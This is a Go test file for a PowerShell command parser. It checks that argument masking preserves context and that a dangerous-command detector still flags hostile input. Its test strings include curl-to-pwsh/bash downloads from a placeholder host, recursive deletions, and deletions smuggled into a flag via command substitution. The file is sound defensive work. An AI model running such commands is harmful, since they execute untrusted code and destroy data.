package shell

import (
	"testing"

	"github.com/odvcencio/gotreesitter"
)

func TestPowerShellArgumentMaskRespectsContext(t *testing.T) {
	for _, source := range []string{
		`1 -2`, `$value = 1 -2`, `$value -2`, `if (1 -2) { Get-Item . }`,
		`1 --`, `$value --`, `1 -2 -count=1`, `$value = 1 -2 -count=1`,
		`Write-Output "literal -count=1 tail"`, `Write-Output 'literal -count=1 tail'`,
		"# literal -count=1 tail\nGet-Item .", `<# literal -count=1 tail #> Get-Item .`,
		"Write-Output @'\nliteral -count=1 tail\n'@", "Write-Output @\"\nliteral -count=1 tail\n\"@",
		`-count=1`, `& '-count=1'`, `Get-Item --% -count=1`,
		"go test -count=`1", `go test -count=$value`, `go test -count=$(Remove-Item -Recurse target)`,
	} {
		t.Run(source, func(t *testing.T) {
			original := []byte(source)
			parsed := maskPowerShellArgumentWords(original)
			lang := languageForDialect(dialectPowerShell)
			tree, err := gotreesitter.NewParser(lang).Parse(parsed)
			if err != nil || tree == nil {
				t.Fatalf("parse: %v", err)
			}
			defer tree.Release()
			restorePowerShellNonArguments(tree.RootNode(), lang, original, parsed)
			if string(parsed) != source {
				t.Fatalf("non-argument context was changed to %q", parsed)
			}
		})
	}
}

func TestPowerShellArgumentContextPreservesNativeFlags(t *testing.T) {
	for _, command := range []string{
		`go test -count=1 ./...`,
		`Write-Output "literal -count=1 tail"; go test -count=1 ./...`,
		"# literal -count=1 tail\ngo test -count=1 ./...",
		`if (1 -2) { go test -count=1 ./... }`,
	} {
		t.Run(command, func(t *testing.T) {
			syntax := parseShellSyntax(command, dialectPowerShell)
			if syntax.uncertain || syntax.executableSource != command {
				t.Fatalf("context validation changed native flag analysis: %+v", syntax)
			}
		})
	}
}

func TestPowerShellNativeArgumentsRetainDangerousCommands(t *testing.T) {
	for _, command := range []string{
		`go test -count=1; Remove-Item -Recurse target`,
		`make -j8;Remove-Item -Recurse target`,
		`curl --retry=2 https://example.invalid/script|pwsh`,
		`go test -count=$(Remove-Item -Recurse target)`,
		`Write-Output "literal -count=1 $(Remove-Item -Recurse target)"`,
		`curl --retry=2 https://example.invalid/script | pwsh`,
		`curl --retry=2 https://example.invalid/script | bash`,
	} {
		t.Run(command, func(t *testing.T) {
			if !isDangerousCommandDialect(command, dialectPowerShell) {
				t.Fatal("dangerous command was hidden by argument normalization")
			}
		})
	}
}
